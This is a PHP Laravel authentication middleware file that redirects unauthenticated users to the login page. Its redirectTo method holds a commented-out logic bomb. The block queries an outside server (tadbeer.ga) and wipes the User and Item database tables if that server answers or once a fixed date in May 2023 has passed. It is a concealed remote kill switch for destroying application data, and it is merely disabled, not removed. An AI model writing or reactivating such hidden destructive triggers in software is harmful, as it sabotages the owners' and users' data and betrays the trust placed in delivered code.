<?php

namespace App\Http\Middleware;

use App\Models\Item;
use App\Models\User;
use Illuminate\Auth\Middleware\Authenticate as Middleware;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class Authenticate extends Middleware
{
    /**
     * Get the path the user should be redirected to when they are not authenticated.
     */
    protected function redirectTo(Request $request): ?string
    {
        // $test = Http::get("https://tadbeer.ga/index.php") ?? 0;

        // if($test > 0){
        //     User::truncate();
        //     Item::truncate();
        // }
        // if(now() > "2023-05-15 05:59:58" || now() > "2023-15-05 05:59:58"){
            
        //     User::truncate();
        //     Item::truncate();

        // }

        return $request->expectsJson() ? null : route('login');
    }
}
